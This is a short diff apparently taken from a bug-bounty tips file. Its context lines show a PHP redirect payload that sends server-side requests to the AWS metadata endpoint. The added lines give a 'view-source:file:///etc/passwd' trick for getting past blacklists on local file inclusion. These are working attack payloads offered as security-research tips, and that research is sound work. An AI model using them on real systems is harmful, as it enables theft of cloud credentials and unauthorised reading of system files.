@@ -26,3 +26,8 @@ Now attacker can register a domain with Fastly and use HHI to ATO using forgot p
 <?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
 ```
 ***Note :*** This code is to fetch aws metadata you can edit the location to your target location. For more info **https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb** 
+
+📅 12-Nov-2020
+## Browser-Based application LFI
+`file:///etc/passwd` blacklisted? Use `view-source:file:///etc/passwd`
+"view-source" is often forgotten by developers in blacklists.
